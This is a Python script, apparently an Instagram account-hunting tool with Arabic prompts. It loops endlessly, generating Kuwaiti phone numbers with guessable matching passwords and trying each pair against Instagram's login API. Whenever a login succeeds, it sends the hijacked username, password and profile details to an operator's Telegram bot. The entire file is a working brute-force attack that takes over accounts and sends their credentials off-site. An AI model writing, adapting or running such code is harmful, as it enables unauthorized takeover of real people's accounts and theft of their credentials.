from time import sleep
import webbrowser, random, requests, user_agent, json
from secrets import token_hex
import secrets, sys, uuid
from uuid import uuid4
from time import sleep
import webbrowser, time
import webbrowser
webbrowser.open('https://t.me/CJlCJ')
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
Z2 = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
aa = 0
zz = 0
print(Z + '\nاختار\n[1] 63\n[2] 50\n[3] 98\n[4] 94\n[5] 988\n[6] 955\n[7] 655\n[8] 97\n[9] 66\n[10] 90')
print(A + '─━━━━━━⊱✿⊰━━━━━━─')
Extra = input(G + ' رقم الصيد:  ')
extra2 = input(G + ' 𝚃𝙾𝙺𝙸𝙽 :  ')
extra1 = input(G + ' 𝙸𝙳 : ')
print(A + '─━━━━━━⊱✿⊰━━━━━━─')
import time
t = time.localtime()
current_time = time.strftime('%H:%M:%S', t)
start_msg = requests.post(f"https://api.telegram.org/bot{extra2}/sendMessage?chat_id={extra1}&text= 𝚂𝚃𝙰𝚁𝚃 𝙷𝚄𝙽𝚃...").json()
id_msg = start_msg['result']['message_id']

def code_EXTRA(userI, password):
    cookie = secrets.token_hex(8) * 2
    head = {'HOST':'www.instagram.com', 
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
     'Cookie':'cookie', 
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'missing', 
     'X-CSRFToken':'missing', 
     'Accept-Language':'en-US,en;q=0.9'}
    url_id = f"https://www.instagram.com/{userI}/?__a=1"
    req_id = requests.get(url_id, headers=head).json()
    name = str(req_id['graphql']['user']['full_name'])
    id = str(req_id['graphql']['user']['id'])
    followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
    following = str(req_id['graphql']['user']['edge_follow']['count'])
    isp = str(req_id['graphql']['user']['is_private'])
    idd = str(req_id['graphql']['user']['id'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
    ree = re.json()
    dat = ree['data']
    eXtra = G + F'''\n\n 𝙽𝙴𝚆\𝙺𝙴𝚁𝙾𝙾 𝚃𝙾𝙾𝙻\n─━━━━━━⊱KᗴᖇOO⊰━━━━━━─\n✅𝙽𝙰𝙼𝙴 : {name} .\n✅𝚄𝚂𝙴𝚁 : {userI} .\n✅𝙿𝙰𝚂𝚂 : {password} .\n✅𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes} .\n✅𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following} .\n✅𝙳𝙰𝚃𝙴 : {dat} .\n─━━━━━━⊱✿⊰━━━━━━─\n✅𝙲𝙷:@NYJYY'''
    tlg = f"https://api.telegram.org/bot{extra2}/sendMessage?chat_id={extra1}&text={eXtra}"
    i = requests.post(tlg)
    print(G + eXtra)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 
 'Accept':'*/*', 
 'Cookie':'missing', 
 'Accept-Encoding':'gzip, deflate', 
 'Accept-Language':'en-US', 
 'X-IG-Capabilities':'3brTvw==', 
 'X-IG-Connection-Type':'WIFI', 
 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
 'Host':'i.instagram.com'}
user = '9087654321'
while True:
    if Extra == '1':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96563' + us
        password = '63' + us
    if Extra == '2':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96550' + us
        password = '50' + us
    if Extra == '3':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96598' + us
        password = '98' + us
    if Extra == '4':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96594' + us
        password = '94' + us
    if Extra == '5':
        us = str(''.join((random.choice(user) for i in range(5))))
        username = '+965998' + us
        password = '998' + us
    if Extra == '6':
        us = str(''.join((random.choice(user) for i in range(5))))
        username = '+965955' + us
        password = '955' + us
    if Extra == '7':
        us = str(''.join((random.choice(user) for i in range(5))))
        username = '+965655' + us
        password = '655' + us
    if Extra == '8':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96597' + us
        password = '97' + us
    if Extra == '9':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96566' + us
        password = '66' + us
    if Extra == '10':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96590' + us
        password = '90' + us
                 
    uid = str(uuid4())
    data = {'uuid':uid, 
     'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
    req = requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        zz += 1
        userQ = req.json()['logged_in_user']['username']
        code_EXTRA(userQ, password)
    elif '"message":"challenge_required","challenge"' in req.json():
        print(S + 'username : ' + username + ': password : ' + password)
    else:
        requests.post(f"https://api.telegram.org/bot{extra2}/editmessagetext?chat_id={extra1}&message_id={id_msg}&text=𝙷𝙸 𝙿𝚁𝙾 𝙸 𝙰𝙼 𝙺𝙴𝚁𝙾𝙾✅\n ─━━━━━━⊱✿⊰━━━━━━─\n ✅𝙷𝚄𝙽𝚃 [{zz}]\n*╔═══❖•ೋ° °ೋ•❖═══╗*\n                  [{username}]\n*╚═══❖•ೋ° °ೋ•❖═══╝*\n✅𝙶𝚄𝙴𝚂𝚂[{aa}] \n─━━━━━━⊱✿⊰━━━━━━─\n✅𝙲𝙷:@KM8MM ")
        print(E + 'username : ' + username + ': password : ' + password)
        aa += 1
